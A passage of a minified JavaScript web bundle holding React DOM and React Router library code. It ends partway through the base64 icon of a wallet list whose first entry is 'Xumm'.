      n.onRecoverableError !== void 0 && (o = n.onRecoverableError)),
    (t = _c(t, null, e, 1, n ?? null, l, !1, i, o)),
    (e[Ye] = t.current),
    qn(e),
    r)
  )
    for (e = 0; e < r.length; e++)
      (n = r[e]),
        (l = n._getVersion),
        (l = l(n._source)),
        t.mutableSourceEagerHydrationData == null
          ? (t.mutableSourceEagerHydrationData = [n, l])
          : t.mutableSourceEagerHydrationData.push(n, l);
  return new Tl(t);
};
xe.render = function (e, t, n) {
  if (!Ll(t)) throw Error(x(200));
  return Ul(null, e, t, !1, n);
};
xe.unmountComponentAtNode = function (e) {
  if (!Ll(e)) throw Error(x(40));
  return e._reactRootContainer
    ? (zt(function () {
        Ul(null, null, e, !1, function () {
          (e._reactRootContainer = null), (e[Ye] = null);
        });
      }),
      !0)
    : !1;
};
xe.unstable_batchedUpdates = _o;
xe.unstable_renderSubtreeIntoContainer = function (e, t, n, r) {
  if (!Ll(n)) throw Error(x(200));
  if (e == null || e._reactInternals === void 0) throw Error(x(38));
  return Ul(e, t, n, !1, r);
};
xe.version = "18.3.1-next-f1338f8080-20240426";
function ef() {
  if (
    !(
      typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" ||
      typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function"
    )
  )
    try {
      __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(ef);
    } catch (e) {
      console.error(e);
    }
}
ef(), (ea.exports = xe);
var cA = ea.exports,
  tf,
  Ss = cA;
(tf = Ss.createRoot), Ss.hydrateRoot;
/**
 * @remix-run/router v1.23.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */ function pl() {
  return (
    (pl = Object.assign
      ? Object.assign.bind()
      : function (e) {
          for (var t = 1; t < arguments.length; t++) {
            var n = arguments[t];
            for (var r in n)
              Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
          }
          return e;
        }),
    pl.apply(this, arguments)
  );
}
var ot;
(function (e) {
  (e.Pop = "POP"), (e.Push = "PUSH"), (e.Replace = "REPLACE");
})(ot || (ot = {}));
const xs = "popstate";
function fA(e) {
  e === void 0 && (e = {});
  function t(r, l) {
    let { pathname: i, search: o, hash: u } = r.location;
    return io(
      "",
      { pathname: i, search: o, hash: u },
      (l.state && l.state.usr) || null,
      (l.state && l.state.key) || "default"
    );
  }
  function n(r, l) {
    return typeof l == "string" ? l : rf(l);
  }
  return pA(t, n, null, e);
}
function ge(e, t) {
  if (e === !1 || e === null || typeof e > "u") throw new Error(t);
}
function nf(e, t) {
  if (!e) {
    typeof console < "u" && console.warn(t);
    try {
      throw new Error(t);
    } catch {}
  }
}
function dA() {
  return Math.random().toString(36).substr(2, 8);
}
function Es(e, t) {
  return { usr: e.state, key: e.key, idx: t };
}
function io(e, t, n, r) {
  return (
    n === void 0 && (n = null),
    pl(
      { pathname: typeof e == "string" ? e : e.pathname, search: "", hash: "" },
      typeof t == "string" ? Il(t) : t,
      { state: n, key: (t && t.key) || r || dA() }
    )
  );
}
function rf(e) {
  let { pathname: t = "/", search: n = "", hash: r = "" } = e;
  return (
    n && n !== "?" && (t += n.charAt(0) === "?" ? n : "?" + n),
    r && r !== "#" && (t += r.charAt(0) === "#" ? r : "#" + r),
    t
  );
}
function Il(e) {
  let t = {};
  if (e) {
    let n = e.indexOf("#");
    n >= 0 && ((t.hash = e.substr(n)), (e = e.substr(0, n)));
    let r = e.indexOf("?");
    r >= 0 && ((t.search = e.substr(r)), (e = e.substr(0, r))),
      e && (t.pathname = e);
  }
  return t;
}
function pA(e, t, n, r) {
  r === void 0 && (r = {});
  let { window: l = document.defaultView, v5Compat: i = !1 } = r,
    o = l.history,
    u = ot.Pop,
    s = null,
    a = p();
  a == null && ((a = 0), o.replaceState(pl({}, o.state, { idx: a }), ""));
  function p() {
    return (o.state || { idx: null }).idx;
  }
  function d() {
    u = ot.Pop;
    let S = p(),
      f = S == null ? null : S - a;
    (a = S), s && s({ action: u, location: w.location, delta: f });
  }
  function h(S, f) {
    u = ot.Push;
    let c = io(w.location, S, f);
    a = p() + 1;
    let A = Es(c, a),
      y = w.createHref(c);
    try {
      o.pushState(A, "", y);
    } catch (k) {
      if (k instanceof DOMException && k.name === "DataCloneError") throw k;
      l.location.assign(y);
    }
    i && s && s({ action: u, location: w.location, delta: 1 });
  }
  function g(S, f) {
    u = ot.Replace;
    let c = io(w.location, S, f);
    a = p();
    let A = Es(c, a),
      y = w.createHref(c);
    o.replaceState(A, "", y),
      i && s && s({ action: u, location: w.location, delta: 0 });
  }
  function v(S) {
    let f = l.location.origin !== "null" ? l.location.origin : l.location.href,
      c = typeof S == "string" ? S : rf(S);
    return (
      (c = c.replace(/ $/, "%20")),
      ge(
        f,
        "No window.location.(origin|href) available to create URL for href: " +
          c
      ),
      new URL(c, f)
    );
  }
  let w = {
    get action() {
      return u;
    },
    get location() {
      return e(l, o);
    },
    listen(S) {
      if (s) throw new Error("A history only accepts one active listener");
      return (
        l.addEventListener(xs, d),
        (s = S),
        () => {
          l.removeEventListener(xs, d), (s = null);
        }
      );
    },
    createHref(S) {
      return t(l, S);
    },
    createURL: v,
    encodeLocation(S) {
      let f = v(S);
      return { pathname: f.pathname, search: f.search, hash: f.hash };
    },
    push: h,
    replace: g,
    go(S) {
      return o.go(S);
    },
  };
  return w;
}
var ks;
(function (e) {
  (e.data = "data"),
    (e.deferred = "deferred"),
    (e.redirect = "redirect"),
    (e.error = "error");
})(ks || (ks = {}));
function AA(e, t, n) {
  return n === void 0 && (n = "/"), hA(e, t, n);
}
function hA(e, t, n, r) {
  let l = typeof t == "string" ? Il(t) : t,
    i = uf(l.pathname || "/", n);
  if (i == null) return null;
  let o = lf(e);
  mA(o);
  let u = null;
  for (let s = 0; u == null && s < o.length; ++s) {
    let a = jA(i);
    u = CA(o[s], a);
  }
  return u;
}
function lf(e, t, n, r) {
  t === void 0 && (t = []), n === void 0 && (n = []), r === void 0 && (r = "");
  let l = (i, o, u) => {
    let s = {
      relativePath: u === void 0 ? i.path || "" : u,
      caseSensitive: i.caseSensitive === !0,
      childrenIndex: o,
      route: i,
    };
    s.relativePath.startsWith("/") &&
      (ge(
        s.relativePath.startsWith(r),
        'Absolute route path "' +
          s.relativePath +
          '" nested under path ' +
          ('"' + r + '" is not valid. An absolute child route path ') +
          "must start with the combined path of all its parent routes."
      ),
      (s.relativePath = s.relativePath.slice(r.length)));
    let a = tn([r, s.relativePath]),
      p = n.concat(s);
    i.children &&
      i.children.length > 0 &&
      (ge(
        i.index !== !0,
        "Index routes must not have child routes. Please remove " +
          ('all child routes from route path "' + a + '".')
      ),
      lf(i.children, t, p, a)),
      !(i.path == null && !i.index) &&
        t.push({ path: a, score: EA(a, i.index), routesMeta: p });
  };
  return (
    e.forEach((i, o) => {
      var u;
      if (i.path === "" || !((u = i.path) != null && u.includes("?"))) l(i, o);
      else for (let s of of(i.path)) l(i, o, s);
    }),
    t
  );
}
function of(e) {
  let t = e.split("/");
  if (t.length === 0) return [];
  let [n, ...r] = t,
    l = n.endsWith("?"),
    i = n.replace(/\?$/, "");
  if (r.length === 0) return l ? [i, ""] : [i];
  let o = of(r.join("/")),
    u = [];
  return (
    u.push(...o.map((s) => (s === "" ? i : [i, s].join("/")))),
    l && u.push(...o),
    u.map((s) => (e.startsWith("/") && s === "" ? "/" : s))
  );
}
function mA(e) {
  e.sort((t, n) =>
    t.score !== n.score
      ? n.score - t.score
      : kA(
          t.routesMeta.map((r) => r.childrenIndex),
          n.routesMeta.map((r) => r.childrenIndex)
        )
  );
}
const gA = /^:[\w-]+$/,
  vA = 3,
  yA = 2,
  wA = 1,
  SA = 10,
  xA = -2,
  Cs = (e) => e === "*";
function EA(e, t) {
  let n = e.split("/"),
    r = n.length;
  return (
    n.some(Cs) && (r += xA),
    t && (r += yA),
    n
      .filter((l) => !Cs(l))
      .reduce((l, i) => l + (gA.test(i) ? vA : i === "" ? wA : SA), r)
  );
}
function kA(e, t) {
  return e.length === t.length && e.slice(0, -1).every((r, l) => r === t[l])
    ? e[e.length - 1] - t[t.length - 1]
    : 0;
}
function CA(e, t, n) {
  let { routesMeta: r } = e,
    l = {},
    i = "/",
    o = [];
  for (let u = 0; u < r.length; ++u) {
    let s = r[u],
      a = u === r.length - 1,
      p = i === "/" ? t : t.slice(i.length) || "/",
      d = PA(
        { path: s.relativePath, caseSensitive: s.caseSensitive, end: a },
        p
      ),
      h = s.route;
    if (!d) return null;
    Object.assign(l, d.params),
      o.push({
        params: l,
        pathname: tn([i, d.pathname]),
        pathnameBase: TA(tn([i, d.pathnameBase])),
        route: h,
      }),
      d.pathnameBase !== "/" && (i = tn([i, d.pathnameBase]));
  }
  return o;
}
function PA(e, t) {
  typeof e == "string" && (e = { path: e, caseSensitive: !1, end: !0 });
  let [n, r] = NA(e.path, e.caseSensitive, e.end),
    l = t.match(n);
  if (!l) return null;
  let i = l[0],
    o = i.replace(/(.)\/+$/, "$1"),
    u = l.slice(1);
  return {
    params: r.reduce((a, p, d) => {
      let { paramName: h, isOptional: g } = p;
      if (h === "*") {
        let w = u[d] || "";
        o = i.slice(0, i.length - w.length).replace(/(.)\/+$/, "$1");
      }
      const v = u[d];
      return (
        g && !v ? (a[h] = void 0) : (a[h] = (v || "").replace(/%2F/g, "/")), a
      );
    }, {}),
    pathname: i,
    pathnameBase: o,
    pattern: e,
  };
}
function NA(e, t, n) {
  t === void 0 && (t = !1),
    n === void 0 && (n = !0),
    nf(
      e === "*" || !e.endsWith("*") || e.endsWith("/*"),
      'Route path "' +
        e +
        '" will be treated as if it were ' +
        ('"' + e.replace(/\*$/, "/*") + '" because the `*` character must ') +
        "always follow a `/` in the pattern. To get rid of this warning, " +
        ('please change the route path to "' + e.replace(/\*$/, "/*") + '".')
    );
  let r = [],
    l =
      "^" +
      e
        .replace(/\/*\*?$/, "")
        .replace(/^\/*/, "/")
        .replace(/[\\.*+^${}|()[\]]/g, "\\$&")
        .replace(
          /\/:([\w-]+)(\?)?/g,
          (o, u, s) => (
            r.push({ paramName: u, isOptional: s != null }),
            s ? "/?([^\\/]+)?" : "/([^\\/]+)"
          )
        );
  return (
    e.endsWith("*")
      ? (r.push({ paramName: "*" }),
        (l += e === "*" || e === "/*" ? "(.*)$" : "(?:\\/(.+)|\\/*)$"))
      : n
      ? (l += "\\/*$")
      : e !== "" && e !== "/" && (l += "(?:(?=\\/|$))"),
    [new RegExp(l, t ? void 0 : "i"), r]
  );
}
function jA(e) {
  try {
    return e
      .split("/")
      .map((t) => decodeURIComponent(t).replace(/\//g, "%2F"))
      .join("/");
  } catch (t) {
    return (
      nf(
        !1,
        'The URL path "' +
          e +
          '" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent ' +
          ("encoding (" + t + ").")
      ),
      e
    );
  }
}
function uf(e, t) {
  if (t === "/") return e;
  if (!e.toLowerCase().startsWith(t.toLowerCase())) return null;
  let n = t.endsWith("/") ? t.length - 1 : t.length,
    r = e.charAt(n);
  return r && r !== "/" ? null : e.slice(n) || "/";
}
const tn = (e) => e.join("/").replace(/\/\/+/g, "/"),
  TA = (e) => e.replace(/\/+$/, "").replace(/^\/*/, "/");
function LA(e) {
  return (
    e != null &&
    typeof e.status == "number" &&
    typeof e.statusText == "string" &&
    typeof e.internal == "boolean" &&
    "data" in e
  );
}
const sf = ["post", "put", "patch", "delete"];
new Set(sf);
const UA = ["get", ...sf];
new Set(UA);
/**
 * React Router v6.30.1
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */ function Al() {
  return (
    (Al = Object.assign
      ? Object.assign.bind()
      : function (e) {
          for (var t = 1; t < arguments.length; t++) {
            var n = arguments[t];
            for (var r in n)
              Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
          }
          return e;
        }),
    Al.apply(this, arguments)
  );
}
const IA = j.createContext(null),
  zA = j.createContext(null),
  af = j.createContext(null),
  zl = j.createContext(null),
  Rl = j.createContext({ outlet: null, matches: [], isDataRoute: !1 }),
  cf = j.createContext(null);
function ou() {
  return j.useContext(zl) != null;
}
function RA() {
  return ou() || ge(!1), j.useContext(zl).location;
}
function OA(e, t) {
  return MA(e, t);
}
function MA(e, t, n, r) {
  ou() || ge(!1);
  let { navigator: l } = j.useContext(af),
    { matches: i } = j.useContext(Rl),
    o = i[i.length - 1],
    u = o ? o.params : {};
  o && o.pathname;
  let s = o ? o.pathnameBase : "/";
  o && o.route;
  let a = RA(),
    p;
  if (t) {
    var d;
    let S = typeof t == "string" ? Il(t) : t;
    s === "/" || ((d = S.pathname) != null && d.startsWith(s)) || ge(!1),
      (p = S);
  } else p = a;
  let h = p.pathname || "/",
    g = h;
  if (s !== "/") {
    let S = s.replace(/^\//, "").split("/");
    g = "/" + h.replace(/^\//, "").split("/").slice(S.length).join("/");
  }
  let v = AA(e, { pathname: g }),
    w = DA(
      v &&
        v.map((S) =>
          Object.assign({}, S, {
            params: Object.assign({}, u, S.params),
            pathname: tn([
              s,
              l.encodeLocation
                ? l.encodeLocation(S.pathname).pathname
                : S.pathname,
            ]),
            pathnameBase:
              S.pathnameBase === "/"
                ? s
                : tn([
                    s,
                    l.encodeLocation
                      ? l.encodeLocation(S.pathnameBase).pathname
                      : S.pathnameBase,
                  ]),
          })
        ),
      i,
      n,
      r
    );
  return t && w
    ? j.createElement(
        zl.Provider,
        {
          value: {
            location: Al(
              {
                pathname: "/",
                search: "",
                hash: "",
                state: null,
                key: "default",
              },
              p
            ),
            navigationType: ot.Pop,
          },
        },
        w
      )
    : w;
}
function FA() {
  let e = HA(),
    t = LA(e)
      ? e.status + " " + e.statusText
      : e instanceof Error
      ? e.message
      : JSON.stringify(e),
    n = e instanceof Error ? e.stack : null,
    l = { padding: "0.5rem", backgroundColor: "rgba(200,200,200, 0.5)" };
  return j.createElement(
    j.Fragment,
    null,
    j.createElement("h2", null, "Unexpected Application Error!"),
    j.createElement("h3", { style: { fontStyle: "italic" } }, t),
    n ? j.createElement("pre", { style: l }, n) : null,
    null
  );
}
const BA = j.createElement(FA, null);
class VA extends j.Component {
  constructor(t) {
    super(t),
      (this.state = {
        location: t.location,
        revalidation: t.revalidation,
        error: t.error,
      });
  }
  static getDerivedStateFromError(t) {
    return { error: t };
  }
  static getDerivedStateFromProps(t, n) {
    return n.location !== t.location ||
      (n.revalidation !== "idle" && t.revalidation === "idle")
      ? { error: t.error, location: t.location, revalidation: t.revalidation }
      : {
          error: t.error !== void 0 ? t.error : n.error,
          location: n.location,
          revalidation: t.revalidation || n.revalidation,
        };
  }
  componentDidCatch(t, n) {
    console.error(
      "React Router caught the following error during render",
      t,
      n
    );
  }
  render() {
    return this.state.error !== void 0
      ? j.createElement(
          Rl.Provider,
          { value: this.props.routeContext },
          j.createElement(cf.Provider, {
            value: this.state.error,
            children: this.props.component,
          })
        )
      : this.props.children;
  }
}
function QA(e) {
  let { routeContext: t, match: n, children: r } = e,
    l = j.useContext(IA);
  return (
    l &&
      l.static &&
      l.staticContext &&
      (n.route.errorElement || n.route.ErrorBoundary) &&
      (l.staticContext._deepestRenderedBoundaryId = n.route.id),
    j.createElement(Rl.Provider, { value: t }, r)
  );
}
function DA(e, t, n, r) {
  var l;
  if (
    (t === void 0 && (t = []),
    n === void 0 && (n = null),
    r === void 0 && (r = null),
    e == null)
  ) {
    var i;
    if (!n) return null;
    if (n.errors) e = n.matches;
    else if (
      (i = r) != null &&
      i.v7_partialHydration &&
      t.length === 0 &&
      !n.initialized &&
      n.matches.length > 0
    )
      e = n.matches;
    else return null;
  }
  let o = e,
    u = (l = n) == null ? void 0 : l.errors;
  if (u != null) {
    let p = o.findIndex(
      (d) => d.route.id && (u == null ? void 0 : u[d.route.id]) !== void 0
    );
    p >= 0 || ge(!1), (o = o.slice(0, Math.min(o.length, p + 1)));
  }
  let s = !1,
    a = -1;
  if (n && r && r.v7_partialHydration)
    for (let p = 0; p < o.length; p++) {
      let d = o[p];
      if (
        ((d.route.HydrateFallback || d.route.hydrateFallbackElement) && (a = p),
        d.route.id)
      ) {
        let { loaderData: h, errors: g } = n,
          v =
            d.route.loader &&
            h[d.route.id] === void 0 &&
            (!g || g[d.route.id] === void 0);
        if (d.route.lazy || v) {
          (s = !0), a >= 0 ? (o = o.slice(0, a + 1)) : (o = [o[0]]);
          break;
        }
      }
    }
  return o.reduceRight((p, d, h) => {
    let g,
      v = !1,
      w = null,
      S = null;
    n &&
      ((g = u && d.route.id ? u[d.route.id] : void 0),
      (w = d.route.errorElement || BA),
      s &&
        (a < 0 && h === 0
          ? (JA("route-fallback"), (v = !0), (S = null))
          : a === h &&
            ((v = !0), (S = d.route.hydrateFallbackElement || null))));
    let f = t.concat(o.slice(0, h + 1)),
      c = () => {
        let A;
        return (
          g
            ? (A = w)
            : v
            ? (A = S)
            : d.route.Component
            ? (A = j.createElement(d.route.Component, null))
            : d.route.element
            ? (A = d.route.element)
            : (A = p),
          j.createElement(QA, {
            match: d,
            routeContext: { outlet: p, matches: f, isDataRoute: n != null },
            children: A,
          })
        );
      };
    return n && (d.route.ErrorBoundary || d.route.errorElement || h === 0)
      ? j.createElement(VA, {
          location: n.location,
          revalidation: n.revalidation,
          component: w,
          error: g,
          children: c(),
          routeContext: { outlet: null, matches: f, isDataRoute: !0 },
        })
      : c();
  }, null);
}
var ff = (function (e) {
  return (
    (e.UseBlocker = "useBlocker"),
    (e.UseLoaderData = "useLoaderData"),
    (e.UseActionData = "useActionData"),
    (e.UseRouteError = "useRouteError"),
    (e.UseNavigation = "useNavigation"),
    (e.UseRouteLoaderData = "useRouteLoaderData"),
    (e.UseMatches = "useMatches"),
    (e.UseRevalidator = "useRevalidator"),
    (e.UseNavigateStable = "useNavigate"),
    (e.UseRouteId = "useRouteId"),
    e
  );
})(ff || {});
function KA(e) {
  let t = j.useContext(zA);
  return t || ge(!1), t;
}
function WA(e) {
  let t = j.useContext(Rl);
  return t || ge(!1), t;
}
function XA(e) {
  let t = WA(),
    n = t.matches[t.matches.length - 1];
  return n.route.id || ge(!1), n.route.id;
}
function HA() {
  var e;
  let t = j.useContext(cf),
    n = KA(ff.UseRouteError),
    r = XA();
  return t !== void 0 ? t : (e = n.errors) == null ? void 0 : e[r];
}
const Ps = {};
function JA(e, t, n) {
  Ps[e] || (Ps[e] = !0);
}
function GA(e, t) {
  e == null || e.v7_startTransition, e == null || e.v7_relativeSplatPath;
}
function df(e) {
  ge(!1);
}
function qA(e) {
  let {
    basename: t = "/",
    children: n = null,
    location: r,
    navigationType: l = ot.Pop,
    navigator: i,
    static: o = !1,
    future: u,
  } = e;
  ou() && ge(!1);
  let s = t.replace(/^\/*/, "/"),
    a = j.useMemo(
      () => ({
        basename: s,
        navigator: i,
        static: o,
        future: Al({ v7_relativeSplatPath: !1 }, u),
      }),
      [s, u, i, o]
    );
  typeof r == "string" && (r = Il(r));
  let {
      pathname: p = "/",
      search: d = "",
      hash: h = "",
      state: g = null,
      key: v = "default",
    } = r,
    w = j.useMemo(() => {
      let S = uf(p, s);
      return S == null
        ? null
        : {
            location: { pathname: S, search: d, hash: h, state: g, key: v },
            navigationType: l,
          };
    }, [s, p, d, h, g, v, l]);
  return w == null
    ? null
    : j.createElement(
        af.Provider,
        { value: a },
        j.createElement(zl.Provider, { children: n, value: w })
      );
}
function YA(e) {
  let { children: t, location: n } = e;
  return OA(oo(t), n);
}
new Promise(() => {});
function oo(e, t) {
  t === void 0 && (t = []);
  let n = [];
  return (
    j.Children.forEach(e, (r, l) => {
      if (!j.isValidElement(r)) return;
      let i = [...t, l];
      if (r.type === j.Fragment) {
        n.push.apply(n, oo(r.props.children, i));
        return;
      }
      r.type !== df && ge(!1), !r.props.index || !r.props.children || ge(!1);
      let o = {
        id: r.props.id || i.join("-"),
        caseSensitive: r.props.caseSensitive,
        element: r.props.element,
        Component: r.props.Component,
        index: r.props.index,
        path: r.props.path,
        loader: r.props.loader,
        action: r.props.action,
        errorElement: r.props.errorElement,
        ErrorBoundary: r.props.ErrorBoundary,
        hasErrorBoundary:
          r.props.ErrorBoundary != null || r.props.errorElement != null,
        shouldRevalidate: r.props.shouldRevalidate,
        handle: r.props.handle,
        lazy: r.props.lazy,
      };
      r.props.children && (o.children = oo(r.props.children, i)), n.push(o);
    }),
    n
  );
}
/**
 * React Router DOM v6.30.1
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */ const ZA = "6";
try {
  window.__reactRouterVersion = ZA;
} catch {}
const bA = "startTransition",
  Ns = $f[bA];
function _A(e) {
  let { basename: t, children: n, future: r, window: l } = e,
    i = j.useRef();
  i.current == null && (i.current = fA({ window: l, v5Compat: !0 }));
  let o = i.current,
    [u, s] = j.useState({ action: o.action, location: o.location }),
    { v7_startTransition: a } = r || {},
    p = j.useCallback(
      (d) => {
        a && Ns ? Ns(() => s(d)) : s(d);
      },
      [s, a]
    );
  return (
    j.useLayoutEffect(() => o.listen(p), [o, p]),
    j.useEffect(() => GA(r), [r]),
    j.createElement(qA, {
      basename: t,
      children: n,
      location: u.location,
      navigationType: u.action,
      navigator: o,
      future: r,
    })
  );
}
var js;
(function (e) {
  (e.UseScrollRestoration = "useScrollRestoration"),
    (e.UseSubmit = "useSubmit"),
    (e.UseSubmitFetcher = "useSubmitFetcher"),
    (e.UseFetcher = "useFetcher"),
    (e.useViewTransitionState = "useViewTransitionState");
})(js || (js = {}));
var Ts;
(function (e) {
  (e.UseFetcher = "useFetcher"),
    (e.UseFetchers = "useFetchers"),
    (e.UseScrollRestoration = "useScrollRestoration");
})(Ts || (Ts = {}));
const $A = [
    {
      name: "Xumm",
      icon: "data:image/jpeg;base64,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